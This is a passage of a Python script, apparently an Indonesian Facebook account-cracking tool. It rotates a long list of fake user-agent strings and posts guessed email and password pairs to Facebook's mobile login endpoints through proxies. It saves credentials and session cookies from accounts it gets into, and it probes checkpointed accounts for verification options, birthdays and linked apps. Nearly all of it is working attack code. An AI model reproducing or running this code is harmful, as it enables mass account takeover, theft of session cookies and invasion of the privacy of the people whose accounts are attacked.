'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Y1 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36)',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/E7FBAF',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6A Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Y2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 7.1.2; en-us; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.5.6',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36)',
'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16.2',
'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
'Opera/9.80 (Macintosh; Intel Mac OS X 10.14.1) Presto/2.12.388 Version/12.16',
'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
'Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62',
'Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62',
'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52',
'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52',
'Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51',
'Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50',
'Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50',
'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11',
'Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11',
'Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11',
'Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10',
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10',
'Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10',
'Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1',
'Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01',
'Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01',
'Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01',
'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01',
'Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01',
'Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01',
'Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00',
'Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.1 x64; U; en) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.7.39 Version/11.00',
'Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00',
'Opera/9.80 (Windows NT 5.1; U; MRA 5.5 (build 02842); ru) Presto/2.7.62 Version/11.00',
'Opera/9.80 (Windows NT 5.1; U; it) Presto/2.7.62 Version/11.00',
'Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00',
'Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00',
'Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00',
'Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.6.31 Version/10.70',
'Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70',
'Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70'])
			ses.headers.update({"Host":url,"upgrade-insecure-requests":"1","user-agent": ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/","accept-encoding":"gzip, deflate","accept-language":"en-GB,en;q=0.8"})
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=en_GB&_rdr")

			date = {

			"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
			"try_number":"0",

			"unrecognized_tries":"0",

			"email":idf,

			"pass":pw,

			"login":"Log In",

			"bi_xrwh":"0"

			}
			ses.headers.update({"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent": ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https:/"+url+"/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=en_GB&_rdr","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en;q=0.8"})
			bx = ses.post(f"https://{url}/login/device-based/regular/login/?api_key=966242223397117&auth_token=22679713be943e090ab7d6d7d133161d&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F07%252Fnew-ways-to-create-instagram-reels-remix%252F%26src%3Dsdkpreparse&refsrc=deprecated&app_id=966242223397117&cancel=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&lwv=100&locale2=en_GB&refid=9", data=date, allow_redirects = False, proxies=proxy)
			#headd = {'Host': url, 'upgrade-insecure-requests': '1', 'user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Not;A Brand";v="99", "Chromium";v="87"','sec-ch-ua-mobile': '?1','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
#			link = ses.get(f"https://{url}/login.php?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&refsrc=deprecated&_rdr",headers=headd).text
#			date = {'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'email': idf, 'pass': pw, 'login_source': 'comet_headerless_login'}
#			head = {'Host': url, 'content-length': '2175','x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'sec-ch-ua-mobile': '?1', 'user-agent': ua, 'sec-ch-ua': '"Not;A Brand";v="99", "Chromium";v="87"', 'content-type': 'application/x-www-form-urlencoded','accept': '*/*','origin': 'https://'+url, 'sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://{url}/login.php?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&refsrc=deprecated&_rdr', 'accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
#			bx = ses.post(f'https://{url}/login/device-based/regular/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F%3Flogin_source%3Dcomet_headerless_login&amp;refsrc=deprecated&amp;lwv=100&amp;refid=9',data=date,headers=head,proxies=proxy)
			#print(bx,ses.cookies.get_dict())
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r [{kk}>{P}] EMAIL  : {kk}{idf}{P}          \n [{kk}>{P}] SANDI  : {kk}{pw}          {P}\n [{kk}>{P}] LAHIR  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n') 
							break
						except:
							print(f'\r [{kk}>{P}] IDZ  : {kk}{idf}{P}          \n [{kk}>{P}] PASSWORD  : {kk}{pw}        \n [{kk}>{P}] USERAGENT  : {kk}{ua} \n   {P}\n')
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r [{hh}>{P}] IDZ  : {hh}{idf}{P}          \n [{hh}>{P}] PASSWORD  : {hh}{pw}          {P}\n [{hh}>{P}] COOKIE : {hh}{kuki}{P}\n')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
			crack(idf,pwx,url,awal)
		#except Exception as e:print(e)
	loop+=1
	

###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		

def cek_opsi(idf,pw,ua):
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun = f' [{kk}>{P}] email/no  : {kk}{idf}{P}          \n [{kk}>{P}] password  : {kk}{pw}          {P}\n [{kk}>{P}] tanggal lahir  : {kk}{d} {m} {y}{P}           '
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(mek+'\n')
	except:
		m, d, y = '','',''
		akun = f' [{kk}>{P}] IDZ  : {kk}{idf}{P}          \n [{kk}>{P}] PASSWORD  : {kk}{pw}                            \n [{kk}>{P}] UserAgent  : {kk}{ua}             {P}'
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 8A Pro MIUI/V12.0.5.0.QCQIDXM) [FBAN/EMA;FBLC/id_ID;FBAV/313.0.0.3.110;]'}
		res = ses.get('https://mbasic.facebook.com/login.php').text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{hh}>{P}] hore akun tap yes                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n [{kk}>{P}] akun terpasang auten                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n [{hh}√{P}] akun tidak checkpoint                       \n [{hh}•{P}] cookie : {cok}'
			else:
				akun += f'\n [{kk}!{P}] ada {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{kk}{o}{P}] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n [{M}!{P}] kata sandi salah / spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] email/no  : {hh}{idf}{P}          \n [{hh}>{P}] password  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' [{hh}√{P}] aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {P}[{kk}!{P}] aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {P}[{M}!{P}] aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass
	clear_layar()
	back()
	
	
if __name__=='__main__':
	make()	
